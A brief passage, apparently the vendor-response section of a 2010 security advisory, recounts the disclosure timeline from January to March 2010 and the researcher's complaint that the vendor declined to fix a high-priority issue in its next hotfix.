Vendor Response:
First contact on January 12, 2010. Last contact on March 15, 2010. They won’t fix this issue in the upcoming hotfix. I consider that 2 months is a really long time to fix this kind of High priority issue.
The vendor knows that this advisory will be released. No more contact since then.
